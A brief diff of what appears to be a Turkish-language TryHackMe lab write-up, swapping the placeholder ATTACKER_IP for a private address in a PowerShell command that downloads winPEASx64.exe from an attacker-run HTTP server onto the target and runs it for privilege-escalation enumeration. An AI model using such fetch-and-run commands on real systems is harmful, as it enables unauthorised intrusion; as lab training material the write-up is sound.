@@ -113,7 +113,7 @@ python3 -m http.server 8000
 
 ```powershell
 # Hedef makinede (thmuser oturumu)
-Invoke-WebRequest http://ATTACKER_IP:8000/winPEASx64.exe -OutFile winpeas.exe
+Invoke-WebRequest http://192.168.134.19:8000/winPEASx64.exe -OutFile winpeas.exe
 .\winpeas.exe > winpeas.txt
 ```
 
